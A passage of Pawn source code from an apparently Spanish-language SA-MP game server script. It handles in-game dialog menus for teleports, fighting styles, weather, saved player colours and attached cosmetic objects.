				AntiFlood[playerid] = false;
				cmd_lv(playerid,"\1");
			}
			if(listitem == 7)
			{
				AntiFlood[playerid] = false;
				cmd_aa(playerid,"\1");
			}
		}
		else ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Teles+2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				AntiFlood[playerid] = false;
				cmd_dm1(playerid,"\1");
			}
			if(listitem == 1)
			{
				AntiFlood[playerid] = false;
				cmd_dm2(playerid,"\1");
			}
			if(listitem == 2)
			{
				AntiFlood[playerid] = false;
				cmd_dm3(playerid,"\1");
			}
			if(listitem == 3)
			{
				AntiFlood[playerid] = false;
				cmd_dm4(playerid,"\1");
			}
			if(listitem == 4)
			{
				AntiFlood[playerid] = false;
				cmd_minidm(playerid,"\1");
			}
			if(listitem == 5)
			{
				AntiFlood[playerid] = false;
				cmd_minidm2(playerid,"\1");
			}
			if(listitem == 6)
			{
				AntiFlood[playerid] = false;
				cmd_minigundm(playerid,"\1");
			}
			if(listitem == 7)
			{
				AntiFlood[playerid] = false;
				cmd_sniperdm(playerid,"\1");
			}
			if(listitem == 8)
			{
				AntiFlood[playerid] = false;
				cmd_boxdm(playerid,"\1");
			}
			if(listitem == 9)
			{
				AntiFlood[playerid] = false;
				cmd_prodm(playerid,"\1");
			}
			if(listitem == 10)
			{
				AntiFlood[playerid] = false;
				cmd_guerradm(playerid,"\1");
			}
			if(listitem == 11)
			{
				AntiFlood[playerid] = false;
				cmd_desmadre(playerid,"\1");
			}
		}
		else ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Teles+3)
	{
		if(response)
		{
			if(listitem == 0)
			{
				AntiFlood[playerid] = false;
				cmd_pk1(playerid,"\1");
			}
			if(listitem == 1)
			{
				AntiFlood[playerid] = false;
				cmd_pk2(playerid,"\1");
			}
			if(listitem == 2)
			{
				AntiFlood[playerid] = false;
				cmd_pk3(playerid,"\1");
			}
			if(listitem == 3)
			{
				AntiFlood[playerid] = false;
				cmd_pk4(playerid,"\1");
			}
			if(listitem == 4)
			{
				AntiFlood[playerid] = false;
				cmd_pk5(playerid,"\1");
			}
			if(listitem == 5)
			{
				AntiFlood[playerid] = false;
				cmd_pk6(playerid,"\1");
			}
			if(listitem == 6)
			{
				AntiFlood[playerid] = false;
				cmd_nrgpk(playerid,"\1");
			}
			if(listitem == 7)
			{
				AntiFlood[playerid] = false;
				cmd_nrgpk2(playerid,"\1");
			}
			if(listitem == 8)
			{
				AntiFlood[playerid] = false;
				cmd_monsterpk1(playerid,"\1");
			}
			if(listitem == 9)
			{
				AntiFlood[playerid] = false;
				cmd_monsterpk2(playerid,"\1");
			}
			if(listitem == 10)
			{
				AntiFlood[playerid] = false;
				cmd_monsterpk3(playerid,"\1");
			}

		}
		else ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Teles+4)
	{
		if(response)
		{
			if(listitem == 0)
			{
				AntiFlood[playerid] = false;
				cmd_sm1(playerid,"\1");
			}
			if(listitem == 1)
			{
				AntiFlood[playerid] = false;
				cmd_sm2(playerid,"\1");
			}
			if(listitem == 2)
			{
				AntiFlood[playerid] = false;
				cmd_sm3(playerid,"\1");
			}
			if(listitem == 3)
			{
				AntiFlood[playerid] = false;
				cmd_sm4(playerid,"\1");
			}
			if(listitem == 4)
			{
				AntiFlood[playerid] = false;
				cmd_ss1(playerid,"\1");
			}
			if(listitem == 5)
			{
				AntiFlood[playerid] = false;
				cmd_ss2(playerid,"\1");
			}
			if(listitem == 6)
			{
				AntiFlood[playerid] = false;
				cmd_ss3(playerid,"\1");
			}
			if(listitem == 7)
			{
				AntiFlood[playerid] = false;
				cmd_ss4(playerid,"\1");
			}
			if(listitem == 8)
			{
				AntiFlood[playerid] = false;
				cmd_ss5(playerid,"\1");
			}
		}
		else ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Teles+5)
	{
		if(response)
		{
			if(listitem == 0)
			{
				AntiFlood[playerid] = false;
				cmd_grove(playerid,"\1");
			}
			if(listitem == 1)
			{
				AntiFlood[playerid] = false;
				cmd_cementerio(playerid,"\1");
			}
			if(listitem == 2)
			{
				AntiFlood[playerid] = false;
				cmd_playa(playerid,"\1");
			}
			if(listitem == 3)
			{
				AntiFlood[playerid] = false;
				cmd_bikepark(playerid,"\1");
			}
			if(listitem == 4)
			{
				AntiFlood[playerid] = false;
				cmd_mansion(playerid,"\1");
			}
			if(listitem == 5)
			{
				AntiFlood[playerid] = false;
				cmd_area51(playerid,"\1");
			}
			if(listitem == 6)
			{
				AntiFlood[playerid] = false;
				cmd_monte(playerid,"\1");
			}
			if(listitem == 7)
			{
				AntiFlood[playerid] = false;
				cmd_jizzy(playerid,"\1");
			}
			if(listitem == 8)
			{
				AntiFlood[playerid] = false;
				cmd_torre(playerid,"\1");
			}
			if(listitem == 9)
			{
				AntiFlood[playerid] = false;
				cmd_mototrial(playerid,"\1");
			}
			if(listitem == 10)
			{
				AntiFlood[playerid] = false;
				cmd_drift(playerid,"\1");
			}
		}
		else ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Teles+6)
	{
		if(response)
		{
			if(listitem == 0)
			{
				AntiFlood[playerid] = false;
				cmd_rm1(playerid,"\1");
			}
			if(listitem == 1)
			{
				AntiFlood[playerid] = false;
				cmd_rm2(playerid,"\1");
			}
			if(listitem == 2)
			{
				AntiFlood[playerid] = false;
				cmd_rm3(playerid,"\1");
			}
			if(listitem == 3)
			{
				AntiFlood[playerid] = false;
				cmd_sr(playerid,"\1");
			}
		}
		else ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Teles+7)
	{
		if(response)
		{
			if(listitem == 0)
			{
				AntiFlood[playerid] = false;
				cmd_tune1(playerid,"\1");
			}
			if(listitem == 1)
			{
				AntiFlood[playerid] = false;
				cmd_tune2(playerid,"\1");
			}
			if(listitem == 2)
			{
				AntiFlood[playerid] = false;
				cmd_tune3(playerid,"\1");
			}
			if(listitem == 3)
			{
				AntiFlood[playerid] = false;
				cmd_tune4(playerid,"\1");
			}
			if(listitem == 4)
			{
				AntiFlood[playerid] = false;
				cmd_tune5(playerid,"\1");
			}
		}
		else ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == Estilos_Peleas)
	{
		if(response)
		{
			if(listitem==0)
			{
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_NORMAL);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu estilo de pelea a {919770}Normal!" );
			}
			if(listitem==1)
			{
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu estilo de pelea a {919770}Boxeo!" );
			}
			if(listitem==2)
			{
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu estilo de pelea a {919770}KungFu!" );
			}
			if(listitem==3)
			{
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu estilo de pelea a {919770}Patadas!" );
			}
			if(listitem==4)
			{
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_ELBOW);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu estilo de pelea a {919770}Codos!" );
			}
		}
	}
	if(dialogid == Climas)
	{
		if(response)
		{
			if(listitem == 0)
			{
				SetPlayerWeather(playerid, 8);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Tormentoso!" );
			}
			if(listitem == 1)
			{
				SetPlayerWeather(playerid, 9);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Niebla!" );
			}
			if(listitem == 2)
			{
				SetPlayerWeather(playerid, 19);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Tormenta de Arena!" );
			}
			if(listitem == 3)
			{
				SetPlayerWeather(playerid, 20);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Nublado!" );
			}
			if(listitem == 4)
			{
				SetPlayerWeather(playerid, 500);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Cielo Rosa!" );
			}
			if(listitem == 5)
			{
				SetPlayerWeather(playerid, 62);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Cielo Rojo!" );
			}
			if(listitem == 6)
			{
				SetPlayerWeather(playerid, 86);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Cielo Morado!" );
			}
			if(listitem == 7)
			{
				SetPlayerWeather(playerid, 91);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Cielo Negro!" );
			}
			if(listitem == 8)
			{
				SetPlayerWeather(playerid, 72);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Cielo Azul por la Mañana!" );
			}
			if(listitem == 9)
			{
				SetPlayerWeather(playerid, 0);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Cielo Azul por la Tarde!" );
			}
			if(listitem == 10)
			{
				SetPlayerWeather(playerid, 75);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has cambiado tu clima a {919770}Cielo Azul por la Noche!" );
			}
		}
	}
	if(dialogid == DIALOGID2)
	{
		if(response)
		{
			if(listitem == 0)
			{
 				dUserSetINT(PlayerName2(playerid)).("FavColor", 0x0C0303FF);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {000000}Negro]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 1)
			{
				dUserSetINT(PlayerName2(playerid)).("FavColor", 0xFFFEFEFF);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[ColorID: {FFFFFF}Blanco]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 2)
			{
				dUserSetINT(PlayerName2(playerid)).("FavColor", 0xff0000ff);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {FF0000}Rojo]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 3)
			{
				dUserSetINT(PlayerName2(playerid)).("FavColor", 0x0000BBAA);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {0000FF}Azul]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 4)
			{
				dUserSetINT(PlayerName2(playerid)).("FavColor", 0x00FF00FF);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {00FF00}Verde]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 5)
			{
				dUserSetINT(PlayerName2(playerid)).("FavColor", 0xFFFF00AA);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {FFFF00}Amarillo]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 6)
			{
				dUserSetINT(PlayerName2(playerid)).("FavColor", 0xFF69B4AA);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {FF69B4}Rosa]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 7)
			{
				dUserSetINT(PlayerName2(playerid)).("FavColor", 0x0096FFFF);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {00BFFF}Celeste]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 8)
			{
	    		dUserSetINT(PlayerName2(playerid)).("FavColor", 0xFF9600FF);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {FFA500}Naranja]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));
			}
			if(listitem == 9)
			{
	    		dUserSetINT(PlayerName2(playerid)).("FavColor", 0x9932CCFF);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {9932CC}Violeta]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));

			}
			if(listitem == 10)
			{
	    		dUserSetINT(PlayerName2(playerid)).("FavColor", 0xFFD700FF);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {FFD700}Dorado]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));

			}
			if(listitem == 11)
			{
	    		dUserSetINT(PlayerName2(playerid)).("FavColor", 0x993300AA);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {A52A2A}Marron]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));

			}
			if(listitem == 12)
			{
	    		dUserSetINT(PlayerName2(playerid)).("FavColor", 0xAFAFAFAA);
		 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu color se ha guardado correctamente. {FF0000}[Color: {BEBEBE}Gris]");
		 		SendClientMessage(playerid,red,string);
		 		dUserSetINT(PlayerName2(playerid)).("UseColor",1);
    	    	SetPlayerColor(playerid,dUserINT(PlayerName2(playerid)).("FavColor"));

			}
		}
	}
   	if(dialogid == Obje)
	{
		if(response)
		{
			if(listitem==0)
			{
				SetPlayerAttachedObject(playerid,4, 18643, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==1)
			{
				SetPlayerAttachedObject(playerid,4, 3528, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 0.100000, 0.100000, 0.100000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==2)
			{
				SetPlayerAttachedObject(playerid,4, 18646, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==3)
			{
				SetPlayerAttachedObject( playerid, 0, 2114, 2, 0.043076, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==4)
			{
				SetPlayerAttachedObject( playerid, 0, 1598, 2, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==5)
			{
				SetPlayerAttachedObject( playerid, 0, 1210, 6, 0.259532, -0.043030, -0.009978, 85.185333, 271.380615, 253.650283, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==6)
			{
				SetPlayerAttachedObject( playerid, 0, 18843, 1, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, -0.027590, -0.027590, -0.027590 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==7)
			{
				SetPlayerAttachedObject( playerid, 0, 18844, 1, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, -0.027590, -0.027590, -0.027590 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==8)
			{
				SetPlayerAttachedObject( playerid, 0, 18845, 1, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, -0.027590, -0.027590, -0.027590 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==9)
			{
				SetPlayerAttachedObject( playerid, 0, 18749, 2, 0.264992, 0.043229, -0.004249, 0.000000, 87.368362, 165.130233, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==10)
			{
				SetPlayerAttachedObject( playerid, 0, 1550, 15, 0.016491, 0.205742, -0.208498, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==11)
			{
				SetPlayerSkin(playerid, 203);
				SetPlayerAttachedObject( playerid, 0, 339, 1, -0.196002, -0.080445, -0.270755, 0.000000, 55.880481, 215.878097, 1.000000, 1.043437, 1.000000 );
				SetPlayerAttachedObject( playerid, 1, 339, 1, -0.196002, -0.080445, 0.075883, 0.000000, 124.505111, 215.878097, 1.000000, 1.043437, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==12)
			{
				SetPlayerAttachedObject( playerid, 0, 19159, 1, 1.183979, 0.025030, 0.030026, 352.371459, 86.105895, 0.000000, 1.909163, 1.000000, 1.808590 );
				SetPlayerAttachedObject( playerid, 1, 19128, 1, -1.145606, 0.170481, 0.000000, 356.979461, 89.247146, 4.475475, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==13)
			{
				SetPlayerAttachedObject( playerid, 0, 19270, 1, 0.456246, 0.024526, 0.000000, 356.979461, 89.247146, 4.475475, 1.000000, 1.000000, 1.000000 );
				SetPlayerAttachedObject( playerid, 1, 19270, 1, 0.176541, 0.051910, -0.001506, 23.633422, 90.000000, 197.080627, 1.000000, 1.000000, 1.000000 );
				SetPlayerAttachedObject( playerid, 2, 19270, 1, -0.308661, 0.051910, -0.001506, 23.633422, 90.000000, 197.080627, 1.000000, 1.000000, 1.000000 );
				SetPlayerAttachedObject( playerid, 3, 19270, 1, -0.729163, 0.051910, -0.001506, 23.633422, 90.000000, 197.080627, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==14)
			{
				new stringo[475];
				format(stringo,sizeof(stringo),"{FF0000}*{FFFFFF} Humo\n{FF0000}*{FFFFFF} Pedo\n{FF0000}*{FFFFFF} Disfraz de carne\n{FF0000}*{FFFFFF} Sorpresa\n{FF0000}*{FFFFFF} Bolsa en la cabeza\n{FF0000}*{FFFFFF} Disfraz de loro\n{FF0000}*{FFFFFF} Loro en hombro\n{FF0000}*{FFFFFF} Dildo\n{FF0000}*{FFFFFF} Cabeza de pollo",stringo);
				format(stringo, sizeof stringo, "%s\n{FF0000}*{FFFFFF} Disfraz de pollo\n{FF0000}*{FFFFFF} Cabeza grande\n{FF0000}*{FFFFFF} Disfraz de delfin\n{FF0000}*{FFFFFF} Disfraz de tiburón\n{FF0000}*{FFFFFF} Disfraz de tortuga\n{FF0000}Siguiente",stringo);
				ShowPlayerDialog(playerid,Obje2,DIALOG_STYLE_LIST,"Objetos 2",stringo,"Seleccionar","Salir");
			}
		}
	}
	if(dialogid == Obje2)
	{
		if(response)
		{
			if(listitem==0)
			{
				SetPlayerAttachedObject( playerid, 0, 2780, 1, -1.556392, 0.061025, -0.218781, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==1)
			{
				SetPlayerAttachedObject( playerid, 0, 18729, 1, -0.658288, -0.122524, -1.553964, 0.000000, 16.644403, 180.190902, 1.000000, 0.842620, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==2)
			{
				SetPlayerAttachedObject( playerid, 0, 2589, 1, -3.192601, 0.095406, -0.162114, 195.777297, 272.644104, 51.977027, 1.059813, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==3)
			{
				SetPlayerAttachedObject( playerid, 0, 19058, 1, 0.068231, 0.329651, -0.108206, 0.000000, 88.384010, 80.348663, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==4)
			{
				SetPlayerAttachedObject(playerid, 0, 19090, 2, -0.315999, 0.019999, 0.030000, 0.000000, 0.000000, 0.000000, 1.455999, 0.526000, 0.541000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==5)
			{
				SetPlayerAttachedObject(playerid,0,19078,1,-1.000000,-0.517000,0.000000,0.000000,0.299999,10.499994,8.673998,9.400999,7.410993);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==6)
			{
				SetPlayerAttachedObject(playerid,0,19078,4,-0.067000,0.053999,0.018000,-168.400039,-169.800003,-2.800000,1.000000,1.000000,1.000000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==7)
			{
				SetPlayerAttachedObject(playerid,0,19086,15,0.051000,0.000000,-0.424999,0.000000,0.000000,-102.100006,1.000000,1.000000,1.000000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==8)
			{
				SetPlayerAttachedObject(playerid,0,19137,2,0.101000,0.000000,0.000000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto Colocado, usa {C0C0C0}/Quitarobjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==9)
			{
				SetPlayerAttachedObject(playerid,0,19137,15,0.040999,0.000000,-0.130000,-86.300003,106.100013,-96.100051,7.741999,4.874000,5.584998);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==10)
			{
				SetPlayerAttachedObject(playerid,0,18963,2,0.261000,0.084999,0.004999,4.999999,85.400039,84.699974,2.097000,2.627000,3.033999);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==11)
			{
				SetPlayerAttachedObject(playerid,0,1607,2,0.267000,0.000000,0.000000,-0.199999,81.199996,-3.499999,1.135000,1.000000,1.126999);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==12)
			{
				SetPlayerAttachedObject(playerid,0,1608,1,0.000000,0.000000,0.000000,0.499999,89.200042,0.199999,1.000000,1.000000,1.000000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==13)
			{
				SetPlayerAttachedObject(playerid,0,1609,1,-0.358000,0.000000,0.170000,0.000000,93.099998,0.000000,1.427000,1.509000,1.641000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==14)
			{
				new stringo2[475];
